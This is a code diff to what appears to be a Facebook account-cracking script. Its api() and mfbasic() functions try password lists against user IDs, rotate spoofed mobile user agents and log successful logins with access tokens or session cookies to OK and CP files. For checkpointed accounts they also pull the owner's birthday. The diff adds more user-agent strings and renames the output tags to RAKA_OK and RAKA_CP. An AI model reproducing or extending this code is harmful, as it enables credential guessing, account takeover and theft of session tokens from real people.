@@ -747,6 +747,9 @@ def api(uid, pwx):
 	for pw in pwx:
 		pw = pw.lower()
 		ua = random.choice([
+                        'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125',
+                        'BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103',
+                        'BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104',
 			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
 			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
@@ -787,9 +790,9 @@ def api(uid, pwx):
 				sleep(1.5)
 				t -= 1
 		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
-			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
+			print("\r  %s[RAKA_OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  [RAKA_OK] %s|%s\n"%(uid, pw))
 			break
 		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
 			try:
@@ -797,18 +800,18 @@ def api(uid, pwx):
 				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 				month, day, year = ttl.split("/")
 				month = bulan[month]
-				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				print("\r  %s[RAKA_CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				open("CP/%s.txt"%(tanggal),"a").write("  [RAKA_CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 				break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
+			print("\r  %s[RAKA_CP] %s|%s         "%(K,uid, pw))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  [RAKA_CP] %s|%s\n"%(uid, pw))
 			break
 		else:
 			continue
@@ -823,6 +826,9 @@ def mfbasic(uid, pwx,url,**data):
 	for pw in pwx:
 		pw = pw.lower()
 		ua = random.choice([
+                        'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125',
+                        'BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103',
+                        'BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104',
 			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
 			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
@@ -849,9 +855,9 @@ def mfbasic(uid, pwx,url,**data):
 		po=s.post(log_in,data=data)
 		if "c_user" in s.cookies.get_dict().keys():
 			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
-			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, kukis))
+			print("\r  %s[RAKA_OK] %s|%s|%s"%(H,uid, pw, kukis))
 			ok.append("%s|%s"%(uid, pw))
-			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  [RAKA_OK] %s|%s\n"%(uid, pw))
 			break
 		elif "checkpoint" in s.cookies.get_dict().keys():
 			try:
@@ -859,18 +865,18 @@ def mfbasic(uid, pwx,url,**data):
 				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 				month, day, year = ttl.split("/")
 				month = bulan[month]
-				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				print("\r  %s[RAKA_CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				open("CP/%s.txt"%(tanggal),"a").write("  [RAKA_CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 				break
 			except (KeyError, IOError):
 				day = (" ")
 				month = (" ")
 				year = (" ")
 			except:pass
-			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
+			print("\r  %s[RAKA_CP] %s|%s         "%(K,uid, pw))
 			cp.append("%s|%s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  [RAKA_CP] %s|%s\n"%(uid, pw))
 			break
 		else:
 			continue
